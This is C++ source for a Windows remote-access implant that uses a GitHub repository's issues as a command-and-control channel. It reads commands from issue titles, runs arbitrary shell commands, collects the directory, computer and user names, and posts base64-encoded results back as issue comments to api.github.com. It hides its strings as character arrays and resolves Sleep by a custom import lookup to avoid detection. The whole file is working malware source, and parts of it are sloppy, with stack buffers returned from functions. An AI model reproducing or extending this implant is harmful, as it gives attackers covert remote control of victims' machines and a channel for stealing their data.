// tnx to   :   @boku7 for the azureOutlookC2 project : {https://github.com/boku7/azureOutlookC2}
//              it's very inspiring my project.
// credits  :   sektor7 (Noimports, function Obfuscation)
//              https://nachtimwald.com blog (Base64 encoding decoding)

#include <Windows.h>
#include <stdio.h>
#include <wininet.h>
#include <string.h>
#include <stdlib.h>
#include "myAPI.h"

#pragma comment (lib, "Wininet.lib")
#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)

using namespace std;



typedef DWORD (WINAPI * Sl33P)(
    DWORD dwMilliseconds,
    BOOL  bAlertable
);


char* Error(const char* msg) {
    char ret[1000];
    sprintf(ret, "%s (%u)", msg, GetLastError());
    return ret;
}



char* findIssueTitle(char* issue) {
    const char* s = issue;

    const char* pattern1 = "\"title\": \"";
    const char* pattern2 = "\",";

    char* target = NULL;
    char* start, * end;

    if (start = (char*)strstr(s, pattern1))
    {
        start += strlen(pattern1);
        if (end = strstr(start, pattern2))
        {
            target = (char*)malloc(end - start + 1);
            memcpy(target, start, end - start);
            target[end - start] = '\0';
        }
    }

    //if (target) printf("%s\n", target);

    return target;
}

char* PostComment(char* token, char* owner, char* repo, char* issueNbrStr, char* body)
{
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL)
    {
        return Error("Failed in InternetOpenA");
    }
    char domain[] = { 'a','p','i','.','g','i','t','h','u','b','.','c','o','m',0 };
    HINTERNET hConnect = InternetConnectA(hInternet, domain, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)NULL);
    if (!hConnect)
    {
        return Error("Failed in InternetConnectA");
    }
    CHAR aTypes[] = { '*','/','*',0 };
    PCTSTR acceptTypes[] = { (LPCTSTR)aTypes, NULL };
    CHAR Postm[] = { 'P','O','S','T',0 };
    CHAR path[1000];
    memset(path, 0, sizeof(path));
    // repos/" + user + "/" + repo + "/issues/" + i_nbr + "/comments" 
    char repos[] = { 'r','e','p','o','s','/',0 };
    lstrcatA(path, repos);
    lstrcatA(path, owner);
    lstrcatA(path, "/");
    lstrcatA(path, repo);
    char issues[] = { '/','i','s','s','u','e','s','/',0 };
    lstrcatA(path, issues);
    lstrcatA(path, issueNbrStr);
    char comments[] = { '/','c','o','m','m','e','n','t','s',0 };
    lstrcatA(path, comments);
    HINTERNET hRequest = HttpOpenRequestA(hConnect, Postm, path, NULL, NULL, (LPCSTR*)acceptTypes, INTERNET_FLAG_SECURE | INTERNET_FLAG_DONT_CACHE, 0);
    if (!hRequest)
    {
        return Error("Failed in HttpOpenRequestA");
    }
    CHAR headers[4000];
    memset(headers, 0, sizeof(headers));

    CHAR cType[] = { 'C','o','n','t','e','n','t','-','t','y','p','e',':',' ','a','p','p','l','i','c','a','t','i','o','n','/','j','s','o','n',0xd,0xa,'A','u','t','h','o','r','i','z','a','t','i','o','n',':',' ','B','e','a','r','e','r',' ',0 };
    lstrcatA(headers, cType);
    lstrcatA(headers, token);
    int headerLen = lstrlenA(headers);
    char params[8000];
    memset(params, 0, sizeof(params));

    sprintf(params, "{\"owner\":\"%s\", \"repo\" : \"%s\", \"issue_number\" : \"%s\", \"body\" : \"%s\"", owner, repo, issueNbrStr, body);

    int paramLen = lstrlenA(params);
    BOOL bRequestSent = HttpSendRequestA(hRequest, headers, headerLen, params, paramLen);
    if (!bRequestSent)
    {
        return Error("Failed in HttpSendRequestA");
    }
    BOOL bIRF = TRUE;
    const int buffLen = 100000;
    char* buffer = (char*)VirtualAlloc(0, 100000, MEM_COMMIT, PAGE_READWRITE);
    DWORD dwNumberOfBytesRead = -1;
    while (bIRF && dwNumberOfBytesRead != 0) {
        bIRF = InternetReadFile(hRequest, buffer, buffLen, &dwNumberOfBytesRead);
    }
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return NULL;
}


char* GetIssueTitle(char* token, char* owner, char* repo, char* issueNbrStr)
{
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL)
    {
        return Error("Failed in InternetOpenA");
    }
    char domain[] = { 'a','p','i','.','g','i','t','h','u','b','.','c','o','m',0 };
    HINTERNET hConnect = InternetConnectA(hInternet, domain, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)NULL);
    if (!hConnect)
    {
        return Error("Failed in InternetConnectA");
    }
    CHAR aTypes[] = { '*','/','*',0 };
    PCTSTR acceptTypes[] = { (LPCTSTR)aTypes, NULL };
    CHAR Postm[] = { 'G','E','T',0 };
    CHAR path[1000];
    memset(path, 0, sizeof(path));
    // repos/" + user + "/" + repo + "/issues/" + i_nbr + "/comments" 
    char repos[] = { 'r','e','p','o','s','/',0 };
    lstrcatA(path, repos);
    lstrcatA(path, owner);
    lstrcatA(path, "/");
    lstrcatA(path, repo);
    char issues[] = { '/','i','s','s','u','e','s','/',0 };
    lstrcatA(path, issues);
    lstrcatA(path, issueNbrStr);
    
    HINTERNET hRequest = HttpOpenRequestA(hConnect, Postm, path, NULL, NULL, (LPCSTR*)acceptTypes, INTERNET_FLAG_SECURE | INTERNET_FLAG_DONT_CACHE, 0);
    if (!hRequest)
    {
        return Error("Failed in HttpOpenRequestA");
    }
    CHAR headers[4000];
    memset(headers, 0, sizeof(headers));

    CHAR cType[] = { 'C','o','n','t','e','n','t','-','t','y','p','e',':',' ','a','p','p','l','i','c','a','t','i','o','n','/','j','s','o','n',0xd,0xa,'A','u','t','h','o','r','i','z','a','t','i','o','n',':',' ','B','e','a','r','e','r',' ',0 };
    lstrcatA(headers, cType);
    lstrcatA(headers, token);
    int headerLen = lstrlenA(headers);
    char params[8000];
    memset(params, 0, sizeof(params));

    sprintf(params, "{\"owner\":\"%s\", \"repo\" : \"%s\", \"issue_number\" : \"%s\"", owner, repo, issueNbrStr);

    int paramLen = lstrlenA(params);
    BOOL bRequestSent = HttpSendRequestA(hRequest, headers, headerLen, params, paramLen);
    if (!bRequestSent)
    {
        return Error("Failed in HttpSendRequestA");
    }
    BOOL bIRF = TRUE;
    const int buffLen = 100000;
    char* buffer = (char*)VirtualAlloc(0, 100000, MEM_COMMIT, PAGE_READWRITE);
    DWORD dwNumberOfBytesRead = -1;
    while (bIRF && dwNumberOfBytesRead != 0) {
        bIRF = InternetReadFile(hRequest, buffer, buffLen, &dwNumberOfBytesRead);
    }
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return buffer;
}

// base64 thing : https://nachtimwald.com/2017/11/18/base64-encode-and-decode-in-c/

char base46_map[] = { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                     'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                     'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                     'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/' };

char* base64_encode(char* plain) {

    char counts = 0;
    char buffer[3];
    char* cipher = (char*)malloc(strlen(plain) * 4 / 3 + 4);
    int i = 0, c = 0;

    for (i = 0; plain[i] != '\0'; i++) {
        buffer[counts++] = plain[i];
        if (counts == 3) {
            cipher[c++] = base46_map[buffer[0] >> 2];
            cipher[c++] = base46_map[((buffer[0] & 0x03) << 4) + (buffer[1] >> 4)];
            cipher[c++] = base46_map[((buffer[1] & 0x0f) << 2) + (buffer[2] >> 6)];
            cipher[c++] = base46_map[buffer[2] & 0x3f];
            counts = 0;
        }
    }

    if (counts > 0) {
        cipher[c++] = base46_map[buffer[0] >> 2];
        if (counts == 1) {
            cipher[c++] = base46_map[(buffer[0] & 0x03) << 4];
            cipher[c++] = '=';
        }
        else {                      // if counts == 2
            cipher[c++] = base46_map[((buffer[0] & 0x03) << 4) + (buffer[1] >> 4)];
            cipher[c++] = base46_map[(buffer[1] & 0x0f) << 2];
        }
        cipher[c++] = '=';
    }

    cipher[c] = '\0';   /* string padding character */
    return cipher;
}

const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-\\+/";

void b64_generate_decode_table()
{
    int    inv[80];
    size_t i;

    memset(inv, -1, sizeof(inv));
    for (i = 0; i < sizeof(b64chars) - 1; i++) {
        inv[b64chars[i] - 43] = i;
    }
}

int b64_isvalidchar(char c)
{
    if (c >= '0' && c <= '9')
        return 1;
    if (c >= 'A' && c <= 'Z')
        return 1;
    if (c >= 'a' && c <= 'z')
        return 1;
    if (c == '+' || c == '/' || c == '=')
        return 1;
    return 0;
}

size_t b64_decoded_size(const char* in)
{
    size_t len;
    size_t ret;
    size_t i;

    if (in == NULL)
        return 0;

    len = strlen(in);
    ret = len / 4 * 3;

    for (i = len; i-- > 0; ) {
        if (in[i] == '=') {
            ret--;
        }
        else {
            break;
        }
    }

    return ret;
}


int b64invs[] = { 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58,
    59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5,
    6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
    21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28,
    29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42,
    43, 44, 45, 46, 47, 48, 49, 50, 51 };

int b64_decode(const char* in, unsigned char* out, size_t outlen)
{
    size_t len;
    size_t i;
    size_t j;
    int    v;

    if (in == NULL || out == NULL)
        return 0;

    len = strlen(in);
    if (outlen < b64_decoded_size(in) || len % 4 != 0)
        return 0;

    for (i = 0; i < len; i++) {
        if (!b64_isvalidchar(in[i])) {
            return 0;
        }
    }

    for (i = 0, j = 0; i < len; i += 4, j += 3) {
        v = b64invs[in[i] - 43];
        v = (v << 6) | b64invs[in[i + 1] - 43];
        v = in[i + 2] == '=' ? v << 6 : (v << 6) | b64invs[in[i + 2] - 43];
        v = in[i + 3] == '=' ? v << 6 : (v << 6) | b64invs[in[i + 3] - 43];

        out[j] = (v >> 16) & 0xFF;
        if (in[i + 2] != '=')
            out[j + 1] = (v >> 8) & 0xFF;
        if (in[i + 3] != '=')
            out[j + 2] = v & 0xFF;
    }

    return 1;
}

TCHAR Buffer[MAX_PATH];
WIN32_FIND_DATA ffd;
LARGE_INTEGER filesize;
TCHAR szDir[MAX_PATH];
size_t length_of_arg;
FILETIME ftCreationTime;
FILETIME ftLastAccessTime;
FILETIME ftLastWriteTime;
HANDLE hFind = INVALID_HANDLE_VALUE;
DWORD dwError = 0;

char* pw_d() {
    if (GetCurrentDirectory(MAX_PATH, Buffer)) {
        char result[1000];
        wcstombs(result, Buffer, wcslen(Buffer) + 1);
        return result;
    }
    else {
        return Error("Failed in GetCurrentDirectory");
    }
}

char* gtu1d() {
    char result[1000] = "";
    DWORD nSize;
    if (!GetComputerNameA(result, &nSize))
        printf("Failed in GetComputerNameA (%u)\n", GetLastError());


    char UserBuf[1000] = "";
    DWORD pcbBuffer;
    if (!GetUserNameA(UserBuf, &pcbBuffer))
        printf("Failed in GetUserNameA (%u)\n", GetLastError());

    lstrcatA(result, "/");
    lstrcatA(result, UserBuf);
    
    return result;
}

char* sh3ll(const char* command) {
    printf("[+] Sh3ll : \n");
    char   psBuffer1[128];
    char* result = (char*)malloc(1000000);
    strcpy_s(result, 1000000, "");
    FILE* pPipe1;

    if ((pPipe1 = _popen(command, "rt")) == NULL)
        return (char*)"null";

    while (fgets(psBuffer1, 128, pPipe1)){
        //puts(psBuffer1);
        strcat_s(result, 100000, psBuffer1);
    }

    if (feof(pPipe1)){
        //printf("\nProcess returned %d\n", _pclose(pPipe1));
        return result;
    }
    else{
        printf("Error: Failed to read the pipe to the end.\n");
        return (char*)"Error";
    }

}


int main(int argc, char** argv) {
    char* token = argv[1];
    char* owner = argv[2];
    char* repo = argv[3];
    if (argc < 4) {
        printf("usage : Implant.exe <AccessToken> <Username> <Repository>\nThe Repository is better to be private.");
        return -1;
    }

    int issueNbr = 1;
    char gtuidT[] = { 'g','e','t','u','i','d',0};
    char pwdT[] = { 'p','w','d',0 };
    char cmdT[] = { 'c','m','d',0};
    char ext[] = { 'e','x','i','t',0 };
    char* resultEncoded = (char*)malloc(500000);
    char* result = (char*)malloc(500000);

    char issueNbrStr[11];   
    
    

    // decoding part :
    /*
            size_t  out_len = b64_decoded_size(resultEncoded) + 1;
            char* resultDecoded = (char*)malloc(out_len);
            if (!b64_decode(resultEncoded, (unsigned char*)resultDecoded, out_len)) {
                printf("Decode Failure\n");
                return 1;
            }
            resultDecoded[out_len - 1] = '\0';
    */
     
   
    while (1) {
        sprintf(issueNbrStr, "%ld", issueNbr);
        char* issue = GetIssueTitle(token, owner, repo, issueNbrStr);
        char* titleTsk = findIssueTitle(issue);
        printf("titleTsk : %s\n", titleTsk);
        
        if (titleTsk!= NULL && !strncmp(pwdT, titleTsk, 3)) {
            result = pw_d();
            printf("result : %s\n", result);
            resultEncoded = base64_encode(result);
            printf("resultEncoded : %s\n\n", resultEncoded);

            PostComment(token, owner, repo, issueNbrStr, resultEncoded);   
            
        }

        if (titleTsk != NULL && !strncmp(gtuidT, titleTsk, 6)) {
            
            resultEncoded = base64_encode(gtu1d());
            size_t  out_len = b64_decoded_size(resultEncoded) + 1;
            char* resultDecoded = (char*)malloc(out_len);
            if (!b64_decode(resultEncoded, (unsigned char*)resultDecoded, out_len)) {
                printf("Decode Failure\n");
                return 1;
            }
            resultDecoded[out_len - 1] = '\0';
            printf("result : %s\n", resultDecoded);
            printf("resultEncoded : %s\n\n", resultEncoded);
            

            PostComment(token, owner, repo, issueNbrStr, resultEncoded);
            
        }

        if (titleTsk != NULL && !strncmp(cmdT, titleTsk, 3)) {
            char cmnd[sizeof(titleTsk - 4)];
            memcpy(cmnd, &titleTsk[4], sizeof(titleTsk - 4));
            //printf("cmnd : %s\n", cmnd);
            result = sh3ll(cmnd);
            //printf("result : %s\n", result);
            resultEncoded = base64_encode(result);
            printf("resultEncoded : %s\n\n", resultEncoded);

            PostComment(token, owner, repo, issueNbrStr, resultEncoded);

        }

        if (titleTsk != NULL && !strncmp(ext, titleTsk, 4)) {
            result = (char*)"Exited !!";
            //printf("result : %s\n", result);
            resultEncoded = base64_encode(result);
            printf("resultEncoded : %s\n\n", resultEncoded);

            PostComment(token, owner, repo, issueNbrStr, resultEncoded);
            return 0;

        }

        WCHAR krnl[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
        CHAR sl33p[] = { 'S','l','e','e','p',0 };
        Sl33P Psl33p = (Sl33P)myGetProcAddress(myGetModuleHandle(krnl), sl33p);
        Psl33p(3000, FALSE);

        if (titleTsk != NULL) {
            issueNbr++;
        }
    }
    return 0;
    
}
